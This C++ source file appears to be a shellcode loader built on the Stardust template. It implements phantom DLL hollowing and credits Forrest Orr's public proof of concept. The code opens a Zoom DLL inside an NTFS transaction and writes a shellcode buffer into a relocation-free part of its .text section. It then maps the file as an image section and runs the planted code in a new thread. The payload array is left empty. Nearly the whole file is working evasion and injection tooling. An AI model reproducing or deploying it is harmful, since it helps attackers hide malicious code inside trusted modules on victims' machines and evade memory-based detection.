#include <common.h>
#include <constexpr.h>
#include <resolve.h>


//ForestOrr poc here: https://github.com/forrest-orr/phantom-dll-hollower-poc
//blog https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing

using namespace stardust;

extern "C" auto declfn entry(
    _In_ void* args
) -> void {
    stardust::instance()
        .start( args );
}

declfn instance::instance(
    void
) {
    //
    // calculate the shellcode base address + size
    base.address = RipStart();
    base.length  = ( RipData() - base.address ) + END_OFFSET;

    //
    // load the modules from PEB or any other desired way
    //

    if ( ! (( ntdll.handle = resolve::module( expr::hash_string<wchar_t>( L"ntdll.dll" ) ) )) ) {
        return;
    }

    if ( ! (( kernel32.handle = resolve::module( expr::hash_string<wchar_t>( L"kernel32.dll" ) ) )) ) {
        return;
    }

    //
    // let the macro handle the resolving part automatically
    //

    RESOLVE_IMPORT( ntdll );
    RESOLVE_IMPORT( kernel32 );
}

declfn IMAGE_SECTION_HEADER* instance::getHdr(IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHeader, uint64_t qwRVA) {
	for (uint32_t dwX = 0; dwX < pNtHdrs->FileHeader.NumberOfSections; dwX++) {
		IMAGE_SECTION_HEADER* pCurrentSectHdr = pInitialSectHeader;
		uint32_t dwCurrentSectSize;

		pCurrentSectHdr += dwX;

		if (pCurrentSectHdr->Misc.VirtualSize > pCurrentSectHdr->SizeOfRawData) {
			dwCurrentSectSize = pCurrentSectHdr->Misc.VirtualSize;
		}
		else {
			dwCurrentSectSize = pCurrentSectHdr->SizeOfRawData;
		}

		if ((qwRVA >= pCurrentSectHdr->VirtualAddress) && (qwRVA <= (pCurrentSectHdr->VirtualAddress + dwCurrentSectSize))) {
			return pCurrentSectHdr;
		}
	}

	return nullptr;
}

declfn void* instance::getPA(uint8_t* pPEBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, uint64_t qwRVA){
    IMAGE_SECTION_HEADER* pContainSectHdr;
	if ((pContainSectHdr = this->getHdr(pNtHdrs, pInitialSectHdrs, qwRVA)) != nullptr) {
		uint32_t dwOffset = (qwRVA - pContainSectHdr->VirtualAddress);

		if (dwOffset < pContainSectHdr->SizeOfRawData){
			return (uint8_t*)(pPEBuf + pContainSectHdr->PointerToRawData + dwOffset);
		}
	}

	return nullptr;
}

declfn BOOL instance::checkReloc(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwStartRVA, uint32_t dwEndRVA){
    IMAGE_BASE_RELOCATION* pCurrentRelocBlock;
	uint32_t dwRelocBufOffset, dwX;
	bool bWithinRange = false;

	for (pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)pRelocBuf, dwX = 0, dwRelocBufOffset = 0; pCurrentRelocBlock->SizeOfBlock && (dwRelocBufOffset + pCurrentRelocBlock->SizeOfBlock) <= dwRelocBufSize; dwX++) {
		uint32_t dwNumBlocks = ((pCurrentRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t));
		uint16_t* pwCurrentRelocEntry = (uint16_t*)((uint8_t*)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION));

		for (uint32_t dwY = 0; dwY < dwNumBlocks; dwY++, pwCurrentRelocEntry++) {
			if (((*pwCurrentRelocEntry >> 12) & IMAGE_REL_BASED_DIR64) == IMAGE_REL_BASED_DIR64) {
				uint32_t dwRelocEntryRefLocRva = (pCurrentRelocBlock->VirtualAddress + (*pwCurrentRelocEntry & 0x0FFF));

				if (dwRelocEntryRefLocRva >= dwStartRVA && dwRelocEntryRefLocRva < dwEndRVA) {
					bWithinRange = true;
				}
			}
		}

		dwRelocBufOffset += pCurrentRelocBlock->SizeOfBlock;
		pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)((uint8_t*)pCurrentRelocBlock + pCurrentRelocBlock->SizeOfBlock);
	}

	return bWithinRange;
}

declfn BOOL instance::parseTransaction(HANDLE hFile, BYTE* pCodeBuf, uint32_t dwReqBufSize, HANDLE *hTransaction, LPVOID *pFileBuf, DWORD *dwFileSize){
	kernel32.SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
    NTSTATUS NtStatus;
    
    IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)*pFileBuf;
	IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(reinterpret_cast<uint8_t*>(*pFileBuf) + pDosHdr->e_lfanew);
    IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)& pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

    //.text region is size of 129E00 (1.2MB) so assume its okay
    
	for (uint32_t dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
		if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= pSectHdrs->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < (pSectHdrs->VirtualAddress + pSectHdrs->Misc.VirtualSize)) {
			pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
			pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
		}
	}
    uint8_t* pRelocBuf = (uint8_t*)this->getPA(reinterpret_cast<uint8_t*>(*pFileBuf), pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    uint32_t dwCodeRva = 0;
    bool bRangeFound = false;

    if (pRelocBuf != nullptr) {
		for (dwCodeRva = 0; !bRangeFound && dwCodeRva < pSectHdrs->Misc.VirtualSize; dwCodeRva += dwReqBufSize) {
			if (!this->checkReloc(pRelocBuf, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, pSectHdrs->VirtualAddress + dwCodeRva, pSectHdrs->VirtualAddress + dwCodeRva + dwReqBufSize)) {
				bRangeFound = true;
				break;
			}
		}
       
		memory::copy(reinterpret_cast<uint8_t*>(*pFileBuf) + pSectHdrs->PointerToRawData + dwCodeRva, pCodeBuf, dwReqBufSize);

		uint32_t dwBytesWritten = 0;
		kernel32.WriteFile(hFile, *pFileBuf, *dwFileSize, (PDWORD)& dwBytesWritten, nullptr);	

        uint8_t* pMapBuf = nullptr;
        uint8_t* pMappedCode = nullptr;
		uint64_t qwMapBufSize = 0;
		HANDLE hSection = nullptr;

		NtStatus = ntdll.NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile);

		if (NT_SUCCESS(NtStatus)) {
            NtStatus = ntdll.NtMapViewOfSection(hSection, kernel32.GetCurrentProcess(), (void**)&pMapBuf, 0, 0, nullptr, (PSIZE_T)&qwMapBufSize, 1, 0, PAGE_READONLY);

			if (NT_SUCCESS(NtStatus)) {
				if (qwMapBufSize >= pNtHdrs->OptionalHeader.SizeOfImage){
					pMappedCode = pMapBuf + pSectHdrs->VirtualAddress + dwCodeRva;

					//not necessary, mainly for debugging
					LPVOID addr = (LPVOID)pMappedCode;
					HANDLE hThread = kernel32.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
					kernel32.WaitForSingleObject(hThread, INFINITE);
					kernel32.CloseHandle(hThread);
				}
			}
			else{
				return FALSE;
			}
		}
		else {
			return FALSE;
		}
	}

    kernel32.CloseHandle(hFile);
    kernel32.CloseHandle(*hTransaction);
    return TRUE;
}

declfn HANDLE instance::createTransaction(HANDLE *hTransaction, LPVOID *pFileBuf, DWORD *dwFileSize){
    HANDLE hFile = INVALID_HANDLE_VALUE;
    NTSTATUS NtStatus;
	//Define POC DLL here
	//Requires Write permissions
    LPCWSTR filePath = L"C:\\Users\\User\\AppData\\Roaming\\Zoom\\bin\\dvf.dll";
    OBJECT_ATTRIBUTES ObjAttr = {sizeof(OBJECT_ATTRIBUTES)};


    NtStatus = ntdll.NtCreateTransaction(hTransaction, TRANSACTION_ALL_ACCESS, &ObjAttr, NULL, NULL, 0, 0, 0, NULL, NULL);
    if (!NT_SUCCESS(NtStatus)){
        return INVALID_HANDLE_VALUE;
    }

    hFile = kernel32.CreateFileTransactedW(filePath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, *hTransaction, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        kernel32.CloseHandle(*hTransaction);
        return INVALID_HANDLE_VALUE;
    }

    *dwFileSize = kernel32.GetFileSize(hFile, NULL);
    if (*dwFileSize == INVALID_FILE_SIZE) {
        kernel32.CloseHandle(hFile);
        kernel32.CloseHandle(*hTransaction);
        return INVALID_HANDLE_VALUE;
    }

    SIZE_T dwMaxSize = (SIZE_T)(*dwFileSize);
	
    *pFileBuf = kernel32.VirtualAlloc(NULL, dwMaxSize, MEM_COMMIT, PAGE_READWRITE);
    if (!*pFileBuf) {
        kernel32.CloseHandle(hFile);
        kernel32.CloseHandle(*hTransaction);
        return INVALID_HANDLE_VALUE;
    }

    DWORD dwBytesRead = 0;
    if (!kernel32.ReadFile(hFile, *pFileBuf, *dwFileSize, &dwBytesRead, NULL)) {
        kernel32.VirtualFree(*pFileBuf, 0, MEM_RELEASE);
        kernel32.CloseHandle(hFile);
        kernel32.CloseHandle(*hTransaction);
        return INVALID_HANDLE_VALUE;
    }

	return hFile;
}

auto declfn instance::start(
    _In_ void* arg
) -> void {
    BYTE rawData[0] = {
	//
	// shellcode
	//
};
    uint32_t dwReqBufSize = sizeof(rawData);
	HANDLE hTransaction = INVALID_HANDLE_VALUE;
	LPVOID pFileBuf = nullptr;
	DWORD dwFileSize;



    HANDLE hFile = (this->createTransaction(&hTransaction, &pFileBuf, &dwFileSize));
	if (hFile != INVALID_HANDLE_VALUE) {
		this->parseTransaction(hFile, rawData, dwReqBufSize, &hTransaction, &pFileBuf, &dwFileSize);
	}
    return;
}
